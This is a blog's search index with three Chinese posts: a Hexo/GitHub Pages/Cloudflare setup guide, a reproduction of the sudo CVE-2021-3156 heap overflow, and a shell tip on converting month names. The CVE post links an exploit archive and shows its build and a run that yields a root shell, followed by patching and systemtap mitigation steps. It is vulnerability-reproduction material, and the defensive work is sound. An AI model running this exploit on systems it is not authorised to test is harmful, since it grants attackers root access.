<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>使用Hexo+Github Pages+域名+CDN搭建博客</title>
      <link href="/2021/04/03/blog/"/>
      <url>/2021/04/03/blog/</url>
      
        <content type="html"><![CDATA[<h2 id="Hexo"><a href="#Hexo" class="headerlink" title="Hexo"></a>Hexo</h2><h3 id="Github-Pages配置"><a href="#Github-Pages配置" class="headerlink" title="Github Pages配置"></a>Github Pages配置</h3><ol><li><p>首先打开github创建一个存储库，存储库名称为你的<strong>github用户名.github.io</strong>，如：<code>doubleee.github.io</code></p><img src="20210404205654.png" style="border:1px solid #CCC; padding:2px;"/><img src="20210404210218.png" style="border:1px solid #CCC; padding:2px;" /></li><li><p>创建完成后访问该地址<code>doubleee.github.io</code>，如下图所示</p><img src="20210404211751.png" style="border:1px solid #ccc; padding:2px"/></li><li><p>Github Pages配置到这里就完成了</p></li></ol><h3 id="Hexo环境"><a href="#Hexo环境" class="headerlink" title="Hexo环境"></a>Hexo环境</h3><p>Hexo环境使用现成的docker镜像：</p><pre><code class="bash">docker pull xyzzpwn/hexo #拉取镜像</code></pre><p> 镜像注意事项</p><ul><li><p>该镜像为即起即用，退出后就销毁环境</p></li><li><p>挂载目录方式，仅需备份本地文件即可，需要迁移时修改挂载目录即可（注：挂载目录不能有文件或文件夹，否则无法初始化并报错）</p></li><li><p>使用时运行如下命令即可</p></li></ul><pre><code class="bash">docker run -it --rm -p 4000:4000 -v /dir:/workdir -w /workdir xyzzpwn/hexo bash # -v /dir 为本地挂载路径，如：-v /home/aaa/blog</code></pre><p>也可以将其简化，如下（需要root权限）：</p><pre><code class="bash">echo &quot;docker run -it --rm -p 4000:4000 -v /home/用户名/博客存放目录:/workdir -w /workdir xyzzpwn/hexo bash&quot; &gt; /usr/bin/hexo-docker &amp; chown 常用普通用户:常用普通用户组名 /usr/bin/hexo-docker &amp;&amp;chmod 550 /usr/bin/hexo-docker</code></pre><ul><li><p>示例：</p><pre><code class="bash">aaa@Ubuntu:~$ su rootPassword:root@Ubuntu:/home/aaa# echo &quot;docker run -it --rm -p 4000:4000 -v /home/aaa/blog:/workdir -w /workdir xyzzpwn/hexo bash&quot; &gt; /usr/bin/hexo-docker &amp;&amp; chown aaa:aaa /usr/bin/hexo-docker &amp;&amp;chmod 550 /usr/bin/hexo-docker</code></pre></li></ul><p>后续使用的时候，在宿主机上运行<code>hexo-docker</code>即可进入到容器进行操作</p><pre><code class="bash">┌──(double㉿ubuntu14)-[~]└─$ hexo-dockerroot@def18525972e:/workdir#</code></pre><h4 id="hexo初始化"><a href="#hexo初始化" class="headerlink" title="hexo初始化"></a>hexo初始化</h4><ol><li><p>首先初始化hexo项目，在上面的docker容器启动后运行<code>hexo init</code>：</p><pre><code class="bash">root@b413e86ecb4b:/workdir# hexo init………………INFO  Start blogging with Hexo!root@b413e86ecb4b:/workdir#</code></pre></li><li><p>启动WEB服务<code>hexo s</code>:</p><pre><code class="bash">root@b413e86ecb4b:/workdir# hexo sINFO  Validating configINFO  Start processingINFO  Hexo is running at http://localhost:4000 . Press Ctrl+C to stop.</code></pre> <img src="20210404213202.png" style="border:1px solid #ccc; padding:2px"/></li><li><p>到这里，本地的hexo项目就已经创建并可以访问了</p><h4 id="Hexo主题"><a href="#Hexo主题" class="headerlink" title="Hexo主题"></a>Hexo主题</h4></li></ol><ul><li>这里使用Next主题，其它主题请<a href="https://hexo.io/themes/">点击这里</a>到官方网站挑选</li><li>这里仅提供修改主题为Next的方法，该主题个性化配置请访问<a href="http://theme-next.iissnan.com/">Next配置说明</a> or <a href="http://theme-next.iissnan.com/">http://theme-next.iissnan.com/</a></li></ul><ol><li><p>下载Next文件到Hexo项目的themes目录<code>git clone https://github.com/theme-next/hexo-theme-next themes/next</code>：</p><pre><code class="bash">root@0b1814492618:/workdir# git clone https://github.com/theme-next/hexo-theme-next themes/nextCloning into &#39;themes/next&#39;...………………root@0b1814492618:/workdir#</code></pre></li><li><p>修改hexo配置主题为next<code>vim _config.yml</code>、语言为中文，保存并退出</p><p><img src="20210404214931.png"></p><p><img src="20210404220438.png"></p></li><li><p>重新使用Hexo生成静态文件<code>hexo g</code>、<code>hexo s</code>启动web服务</p><p><img src="20210404220523.png"></p></li></ol><h4 id="Hexo的使用"><a href="#Hexo的使用" class="headerlink" title="Hexo的使用"></a>Hexo的使用</h4><ol><li><p>创建文章命令<code>hexo new &quot;文章名称&quot;</code>：</p><pre><code class="bash">root@def18525972e:/workdir# hexo new &quot;test&quot;INFO  Validating configINFO  Created: /workdir/source/_posts/test.mdroot@def18525972e:/workdir#</code></pre></li><li><p>打开Markdown文件并进行编辑（Markdown文件在hexo项目下<code>source/_posts/</code>，完整路径<code>/home/aaa/blog/source/_posts</code>)</p><p><img src="20210404221628.png"></p></li><li><p>启动hexo web服务访问页面<code>hexo s</code></p>   <img src="20210404225918.png" style="border:1px solid #ccc; padding:2px"/><p>   <strong>注：可以通过安装hexo插件的方式实现在线编辑文章</strong> 指路→ <a href="https://github.com/jaredly/hexo-admin">hexo-admin</a>（需要依赖nodejs，仅能在本地运行，无法部署到github）</p></li></ol><h4 id="部署到github"><a href="#部署到github" class="headerlink" title="部署到github"></a>部署到github</h4><h5 id="一、使用脚本部署（推荐）"><a href="#一、使用脚本部署（推荐）" class="headerlink" title="一、使用脚本部署（推荐）"></a>一、使用脚本部署（推荐）</h5><ul><li>使用PAT可实现无需账户密码对github存储库push等功能，无需担心PAT泄露问题，<strong>如果PAT泄露了，到账户中删除该PAT即可</strong></li></ul><ol><li><p>申请<strong>Github PAT</strong>(Personal access tokens)，登录github后打开<code>https://github.com/settings/tokens</code>，点击<strong>Generate new token</strong></p><img src="20210416211256.png" style="border:1px solid #ccc; padding:2px"/></li><li><p>输入名称后勾选上<strong>repo</strong>，滑到底部选择<strong>Generate token</strong>跳转到查看token页面</p><img src="20210416212403.png" style="border:1px solid #ccc; padding:2px"/></li><li><p>点击复制按钮复制token并保存（PAT只能查看一次，务必保存好）</p><img src="20210416211748.png" style="border:1px solid #ccc; padding:2px"/></li><li><p>新建脚本，补充脚本中的内容并保存到hexo目录中名为<strong>deployment.sh</strong>，并使用<code>chmod 550 deployment.sh</code>赋予执行权限</p><pre><code class="shell">#!/bin/bashgithub_username=  # Github用户名github_email=  # Github邮箱github_token=  # Github Personal access tokens（上面申请的PAT）time=$(date  &quot;+%Y-%m-%d %k:%M:%S&quot;)git config --global user.name &quot;$github_name&quot;git config --global user.email &quot;$github_email&quot;if [[ -n $github_username ]] &amp;&amp; [[ -n $github_email ]]  &amp;&amp; [[ -n $github_token ]];then    if [ ! -d .deploy_git ];then        mkdir .deploy_git        git init .deploy_git        cd .deploy_git &amp;&amp; git remote add origin https://$github_username:$github_token@github.com/$github_username/$github_username.github.io.git &amp;&amp; git pull origin main --allow-unrelated-histories &amp;&amp; git branch main &amp;&amp; git checkout main        hexo clean &amp;&amp; hexo g        cp -r ../public/* ../.deploy_git &amp;&amp; git add ./* &amp;&amp; git commit -m &quot;Site updated: $time&quot;  &amp;&amp; git push origin main        echo &quot;部署完成！&quot;    else        hexo clean &amp;&amp; hexo g        rm -rf .deploy_git/* &amp;&amp; cp -r public/* .deploy_git        if [ $(grep -c &quot;remote&quot; .deploy_git/.git/config) -ne 0 ];then            cd .deploy_git &amp;&amp; git add ./* &amp;&amp; git commit -m &quot;Site updated: $time&quot; &amp;&amp; git push origin main            echo &quot;部署完成！&quot;        else            cd .deploy_git &amp;&amp; git remote add origin https://$github_username:$github_token@github.com/$github_username/$github_username.github.io.git &amp;&amp; git pull origin main --allow-unrelated-histories            git add ./* &amp;&amp; git commit -m &quot;Site updated: $time&quot; &amp;&amp; git push origin main        fi    fielse    echo &quot;未配置github相关信息，请配置后再试！&quot;fi</code></pre><p><img src="./20210416213851.png"></p><pre><code class="bash">root@1eda35357680:/workdir# chmod 550 deployment.shroot@1eda35357680:/workdir# ./deployment.sh</code></pre><p><img src="./20210416215511.png"></p><p><img src="./20210416215555.png"></p></li><li><p>访问<strong>name.githun.io</strong>即可查看页面，后续更新只需要运行<code>hexo new &quot;name&quot;</code>新建页面和<code>hexo s</code>在web查看页面样式，确认无误后在docker环境下运行<code>./deployment.sh</code>即可更新到github</p></li></ol><h5 id="二、使用自带插件部署（不推荐，除非自己在物理机上搭建hexo环境）"><a href="#二、使用自带插件部署（不推荐，除非自己在物理机上搭建hexo环境）" class="headerlink" title="二、使用自带插件部署（不推荐，除非自己在物理机上搭建hexo环境）"></a>二、使用自带插件部署（不推荐，除非自己在物理机上搭建hexo环境）</h5><ul><li>部署前先要使用<code>hexo g</code>生成静态文件，才能进行部署，默认使用用户名密码部署。可使用SSH-key方式，但由于使用docker环境，每次启动环境都会变，SSH-key无法固定，不适用这种使用docker hexo环境，SSH-key配置方法<a href="https://www.jianshu.com/p/f6e2d1a19f4f">https://www.jianshu.com/p/f6e2d1a19f4f</a>。</li></ul><ol><li><p>首先需要配置hexo的deploy，如下所示<code> vim _config.yml</code>：</p><pre><code class="config">deploy:    type: git    repo: https://github.com/xxxx/xxxx.github.io #更根据自己的用户配置 xxxx为用户名    branch: main</code></pre></li><li><p>使用hexo自带方式部署<code>hexo d</code>，输入用户名和密码后推送到远程仓库：</p><ul><li><p>安装<strong>hexo-deployer-git</strong>插件<code>npm install hexo-deployer-git --save</code></p></li><li><p>配置github邮箱及用户名</p><ul><li><pre><code class="bash">git config --global user.email &quot;you@example.com&quot;git config --global user.name &quot;Your Name&quot;</code></pre></li></ul></li><li><p>运行部署（需要输入用户名和密码）：</p></li></ul><pre><code class="bash">root@def18525972e:/workdir# hexo d………………Username for &#39;https://github.com&#39;: #你的用户名Password for &#39;https://doubleee@github.com&#39;:………………INFO  Deploy done: git</code></pre><ul><li>如果遇到如下错误：</li></ul><pre><code class="bash">root@def18525972e:/workdir# hexo dINFO  Validating configINFO  Deploying: gitINFO  Clearing .deploy_git folder...INFO  Copying files from public folder...INFO  Copying files from extend dirs...On branch masternothing to commit, working tree cleanfatal: unable to access &#39;https://github.com/doubleee/doubleee.github.io/&#39;: gnutls_handshake() failed: The TLS connection was non-properly terminated.  FATAL &#123;    err: Error: Spawn failed        at ChildProcess.&lt;anonymous&gt; (/workdir/node_modules/hexo-util/lib/spawn.js:51:21)        at ChildProcess.emit (node:events:369:20)        at Process.ChildProcess._handle.onexit (node:internal/child_process:290:12) &#123;   code: 128    &#125; &#125; Something&#39;s wrong. Maybe you can find the solution here: %s https://hexo.io/docs/troubleshooting.html</code></pre><ul><li>解决办法：</li></ul><pre><code class="bash">git config --global --unset http.proxy git config --global --unset https.proxy</code></pre></li><li><p>访问效果</p><img src="20210404225918.png" style="border: 1px solid #ccc; padding:2px"/><p><strong>注：因Github Pages使用了CDN，需要一定时间才能刷新。如果访问不到Hexo页面则需要多刷新几次或等待1~2分钟</strong></p></li></ol><h2 id="绑定自己域名"><a href="#绑定自己域名" class="headerlink" title="绑定自己域名"></a>绑定自己域名</h2><ol><li><p>域名解析我就不过多解释了，到域名解析商处创建一个CNAME记录，地址填写为博客地址的域名：</p><img src="20210404232439.png" style="border: 1px solid #ccc; padding:2px"/></li><li><p>在hexo项目下创建一个名词为<code>CNAME</code>的文件，内容为解析到github.io的地址：</p><pre><code class="bash">echo &quot;blog.doublesec.cn&quot; &gt; public/CNAME#查看域名解析是否成功$ nslookup blog.example.comServer:         114.114.114.114Address:        114.114.114.114#53Non-authoritative answer:blog.example.com       canonical name = doubleeee.github.io.Name:   doubleeee.github.ioAddress: 185.199.108.153Name:   doubleeee.github.ioAddress: 185.199.111.153Name:   doubleeee.github.ioAddress: 185.199.110.153Name:   doubleeee.github.ioAddress: 185.199.109.153</code></pre></li><li><p>使用<code>hexo d</code>部署到github，访问效果如下:</p><img src="20210404233244.png" style="border: 1px solid #ccc; padding:2px"/></li></ol><ol start="4"><li><p>如果提示https证书错误，需要到github存储库的设置中启用https</p><img src="20210404233423.png" style="border: 1px solid #ccc; padding:2px"/><img src="20210404233609.png" style="border: 1px solid #ccc; padding:2px"/> **绑定自己的域名到这里就结束了！**</li></ol><h2 id="使用CDN"><a href="#使用CDN" class="headerlink" title="使用CDN"></a>使用CDN</h2><ul><li>这里使用Cloudflare，为什么选择它呢，因为它针对个人用户是免费的，速度也还行，主要是能够防止狗运营商劫持github.io域名</li><li>关于国内的阿里云、腾讯云这些厂商的CDN，由于他们不提供https证书，需要自己花钱购买https证书，或者使用http方式访问，具体的教程就自己查找吧，因为我也没有测试过</li></ul><ol><li><p>想要在Cloudflare上使用你的域名，首先需要到域名注册商那里修改域名的权威DNS服务器，具体操作<a href="https://blog.csdn.net/zhyl8157121/article/details/100551592">点击这里</a>，按照这个步骤设置后在cloudflare上创建域名并通过Cloudflare节点代理加速：</p><img src="20210404234619.png" style="border: 1px solid #ccc; padding:2px"/></li><li><p>使用nslookup查看一下域名解析是否生效</p><pre><code class="bash">$ nslookup blog.example.comServer:         114.114.114.114Address:        114.114.114.114#53Non-authoritative answer:Name:   blog.example.comAddress: 172.67.149.173Name:   blog.example.comAddress: 104.21.39.228Name:   blog.example.comAddress: 2606:4700:3036::6815:27e4Name:   blog.example.comAddress: 2606:4700:3030::ac43:95ad</code></pre></li><li><p>修改Cloudflare的加密模式</p><img src="20210404235504.png" style="border: 1px solid #ccc; padding:2px"/><p><strong>注：这里不修改加密模式的话访问博客会多次重定向，并且导致浏览器报错而无法访问</strong></p></li></ol>]]></content>
      
      
      
        <tags>
            
            <tag> linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CVE-2021-3156 sudo堆缓冲区溢出漏洞复现</title>
      <link href="/2021/01/30/CVE-2021-3156/"/>
      <url>/2021/01/30/CVE-2021-3156/</url>
      
        <content type="html"><![CDATA[<h2 id="CVE-2021-3256-sudo堆缓冲区溢出漏洞提权复现"><a href="#CVE-2021-3256-sudo堆缓冲区溢出漏洞提权复现" class="headerlink" title="CVE-2021-3256 sudo堆缓冲区溢出漏洞提权复现"></a>CVE-2021-3256 sudo堆缓冲区溢出漏洞提权复现</h2><h3 id="漏洞原因："><a href="#漏洞原因：" class="headerlink" title="漏洞原因："></a>漏洞原因：</h3><ul><li>在<code>sudo</code>解析命令行参数的方式中发现了基于堆的缓冲区溢出。任何本地用户（普通用户和系统用户，<code>sudoer</code>和非<code>sudoers</code>）都可以利用此漏洞，而无需进行身份验证，攻击者不需要知道用户的密码。成功利用此漏洞可以获得<code>root</code>权限。</li></ul><h3 id="用户可以使用如下方法进行自查："><a href="#用户可以使用如下方法进行自查：" class="headerlink" title="用户可以使用如下方法进行自查："></a>用户可以使用如下方法进行自查：</h3><p>以非root用户登录系统，并使用命令<code>sudoedit -s /</code></p><ul><li><p>如果响应一个以<code>sudoedit:</code>开头的报错，那么表明存在漏洞。</p></li><li><p>如果响应一个以<code>usage:</code>开头的报错，那么表明补丁已经生效。</p></li></ul><h3 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h3><ul><li><code>sudo:sudo</code>: 1.8.2 – 1.8.31p2</li><li><code>sudo:sudo</code>: 1.9.0 – 1.9.5p1</li></ul><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><h3 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h3><ul><li>Ubuntu 20.0</li><li>sudo 1.8.31</li><li>exp下载地址 <a href="./CVE-2021-3156.zip">CVE-2021-3156.zip</a></li></ul><p>注：此exp需要<code>make</code>和<code>gcc</code>环境</p><pre><code class="bash">test@ubuntu20:~/CVE-2021-3156$ lsMakefile  hax.c  lib.c  libnss_Xtest@ubuntu20:~/CVE-2021-3156$</code></pre><p> <img src="./20210131004147.png"></p><h3 id="make编译"><a href="#make编译" class="headerlink" title="make编译"></a>make编译</h3><pre><code class="bash">test@ubuntu20:~/CVE-2021-3156$ makerm -rf libnss_Xmkdir libnss_Xgcc -o sudo-hax-me-a-sandwich hax.cgcc -fPIC -shared -o &#39;libnss_X/P0P_SH3LLZ_ .so.2&#39; lib.ctest@ubuntu20:~/CVE-2021-3156$ lsMakefile  hax.c  lib.c  libnss_X  sudo-hax-me-a-sandwichtest@ubuntu20:~/CVE-2021-3156$</code></pre><p> <img src="20210131004226.png"></p><h3 id="运行exp"><a href="#运行exp" class="headerlink" title="运行exp"></a>运行exp</h3><pre><code class="bash">test@ubuntu20:~/CVE-2021-3156$ ./sudo-hax-me-a-sandwich**** CVE-2021-3156 PoC by blasty &lt;peter@haxx.in&gt;[+] bl1ng bl1ng! We got it!# whoamiroot# iduid=0(root) gid=0(root) groups=0(root),1002(test)#</code></pre><p> <img src="20210131004550.png"></p><h2 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h2><h3 id="通用修补建议"><a href="#通用修补建议" class="headerlink" title="通用修补建议"></a>通用修补建议</h3><p>下载升级<code>sudo</code>软件包，下载链接为：</p><p><a href="https://www.sudo.ws/dist/">sudo软件包下载地址</a></p><h3 id="临时修补建议"><a href="#临时修补建议" class="headerlink" title="临时修补建议"></a>临时修补建议</h3><p>对于无法立即更新的用户，建议使用<code>systemtap</code>进行以下临时缓解：</p><ol><li>安装所需的<code>systemtap</code>软件包和依赖项：</li></ol><pre><code class="shell">systemtap yum-utils kernel-devel-&quot;$(uname -r)&quot;</code></pre><p>对于<code>RHEL 7</code>，使用命令安装 kernel debuginfo：<code>debuginfo-install -y kernel-&quot;$(uname -r)&quot;</code>。 对于<code>RHEL 8</code>，使用命令安装 sudo debuginfo：<code>debuginfo-install sudo</code>。</p><ol start="2"><li>创建以下<code>systemtap</code>脚本（将文件命名为<code>sudoedit-block.stap</code>）:</li></ol><pre><code>probe process(&quot;/usr/bin/sudo&quot;).function(&quot;main&quot;) &#123;        command = cmdline_args(0,0,&quot;&quot;);        if (strpos(command, &quot;edit&quot;) &gt;= 0) &#123;                raise(9);        &#125;&#125;</code></pre><ol start="3"><li>使用以下命令安装脚本：（使用root权限）</li></ol><pre><code class="bash"># nohup stap -g sudoedit-block.stap &amp;</code></pre><p>该脚本将使得易受攻击的<code>sudoedit</code>二进制文件停止工作。 <code>sudo</code>命令仍将照常工作。上述更改在重启后失效，必须在每次重启后重新应用。</p><ol start="4"><li>一旦安装了补丁程序，就可以通过取消<code>systemtap</code>进程来删除<code>systemtap</code>脚本。 例如，通过使用：</li></ol><pre><code class="bash"># kill -s SIGTERM 7590 (其中7590是systemtap进程的PID)</code></pre><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://www.anquanke.com/post/id/229948">安全客-CVE-2021-3156：Sudo 堆缓冲区溢出漏洞通告</a></p><p><a href="https://mp.weixin.qq.com/s/v7mot0nCvTmsCqJhBBncuQ">宽字节安全-CVE-2021-3156 Sudo溢出漏洞 复现</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> 漏洞复现 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>shell下英文月份转换数字月份最简易的方法</title>
      <link href="/2020/11/02/shell-switch-month/"/>
      <url>/2020/11/02/shell-switch-month/</url>
      
        <content type="html"><![CDATA[<p>某一次因为需要转换很多英文月份为普通数字月份，在网上找了一些方法，发现大多都很复杂，后来发现了一个简易的方法，在这里分享一下！</p><h4 id="date使用方法"><a href="#date使用方法" class="headerlink" title="date使用方法"></a>date使用方法</h4><p>这里用到的方法是用<code>date</code>命令来完成，它可以把英文月份转换成数字月份(不区分大小写)，也可以把数字转换成英文，示例如下：</p><pre><code class="bash">date -d &quot;13 Feb 2020&quot; +&quot;%Y %m %d&quot;2020 02 13date -d &quot;13 Feb 2020&quot; +&quot;%m&quot; # 如果只需要月份，只需要 %m 即可02date -d &quot;01 Jun 2020&quot; +&quot;%b&quot; # 取英文月份Jun</code></pre><h4 id="在脚本中作为函数调用"><a href="#在脚本中作为函数调用" class="headerlink" title="在脚本中作为函数调用"></a>在脚本中作为函数调用</h4><pre><code class="bash">switch_month()&#123;    date -d &quot;1 $1&quot; +%m # $1表示函数传递的第一个参数(这里-d需要数字1保持格式，否则报错)&#125;switch_month $1 #调用，此处$1为运行脚本是传入的第一个参数</code></pre><h4 id="运行脚本"><a href="#运行脚本" class="headerlink" title="运行脚本"></a>运行脚本</h4><pre><code class="bash">$ sh month.sh nov11$ sh month.sh dec12</code></pre><h4 id="转换Apache日志中的时间"><a href="#转换Apache日志中的时间" class="headerlink" title="转换Apache日志中的时间"></a>转换Apache日志中的时间</h4><pre><code class="bash">awk &#39;&#123;print($4)&#125;&#39; /var/log/apache2/access.log |&gt; sed -e &quot;s/\[//;s/\// /g;s/:/ /1&quot; | date -f - +&quot;%Y %m %d %H:%M:%S&quot;2020 02 03 20:17:512020 02 03 20:17:512020 02 03 20:17:512020 02 03 20:17:522020 02 03 20:19:182020 02 03 20:19:192020 02 03 20:19:362020 02 03 20:19:362020 02 03 20:20:012020 02 03 20:20:012020 02 03 20:20:022020 02 03 20:27:282020 02 03 20:27:282020 02 03 20:27:282020 02 03 20:32:282020 02 13 20:05:472020 02 13 20:05:472020 02 13 20:15:382020 02 13 20:15:432020 02 13 20:15:432020 02 13 20:16:002020 02 13 20:35:372020 02 13 20:35:372020 02 13 20:35:372020 02 13 21:05:332020 02 13 21:15:132020 02 13 21:15:212020 02 13 21:15:262020 06 01 21:50:162020 06 01 21:50:162020 06 01 21:50:16</code></pre><h4 id="关于性能"><a href="#关于性能" class="headerlink" title="关于性能"></a>关于性能</h4><p>服务器上nginx日志有2w+条日志，使用time查看运行总时间为1.8s，结果如下：</p><pre><code class="bash">wc -l /var/log/nginx/access.log 27161 access.logtime awk &#39;&#123;print($4)&#125;&#39; /var/log/nginx/access.log |sed -e &quot;s/\[//;s/\// /g;s/:/ /1&quot; | date -f - +&quot;%Y %m %d %H:%M:%S&quot;2020 06 03 10:44:412020 06 03 10:44:422020 06 03 10:44:42.....................2020 11 03 00:48:192020 11 03 00:52:382020 11 03 01:56:58real    0m1.848suser    0m0.180ssys     0m0.418s</code></pre><p>参考文章：<a href="https://www.coder.work/article/1886206">https://www.coder.work/article/1886206</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> linux </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
